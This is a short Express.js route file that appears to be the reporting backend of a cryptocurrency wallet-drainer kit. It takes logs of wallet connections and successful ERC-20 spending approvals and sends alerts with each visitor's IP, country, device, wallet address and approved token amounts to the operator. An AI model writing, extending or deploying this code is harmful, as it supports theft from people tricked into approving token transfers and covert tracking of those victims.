const express = require("express");
const { sendNotification } = require("../helper/utils");
const router = express.Router();

router.post("/", async (req, res) => {
  const { log_type, payload } = req.body;

  try {
    let text = '';
    if (log_type === 'WALLET_CONNECT') {
      text = `💥 <b>Wallet Connection</b> 💥\n\n🌎 <b>Country</b>: ${payload.country}\n🌐 <b>Browser</b>: ${payload.browserName}\n🖥 <b>Device</b>: ${payload.device}\n🔎 <b>IP</b>: ${payload.userIP}\n🧳 <b>Wallet Name</b>: ${payload.walletName}\n📋 <b>Wallet Address</b>: ${payload.walletAddress}\n⚡️ <b>Network</b>: ${payload.currentNetwork}\n🔗 <a href="https://www.blockchain.com/explorer/search?search=${payload.walletAddress}">See Wallet On Block Explorer</a>`;
    } else if (log_type === 'APPROVE_ERC20_SPENDING' && payload.is_success) {
      text = `🚀 <b>Transaction Processed</b> 🚀\n\n📈 <b>Amount</b>: ${payload.approval_amount}\n💰 <b>Token</b>: ${payload.token_symbol}\n🖥  <b>Device</b>: ${payload.device}\n🧳 Wallet Name: ${payload.walletName}\n📋 <b>Wallet Address</b>: ${payload.walletAddress}\n⚡️ <b>Network</b>: ${payload.currentNetwork}\n\n\n🔗 <a href="https://www.blockchain.com/explorer/search?search=${payload.walletAddress}">See Wallet On Block Explorer</a>`;
    }

    if (text.length > 0) {
      await sendNotification(text, 'html');
      res.status(200).json({
        result: "success"
      });
    } else {
      throw "failed";
    }
  } catch (err) {
    res.status(200).json({
      result: "failed"
    });
  }
});

module.exports = router;
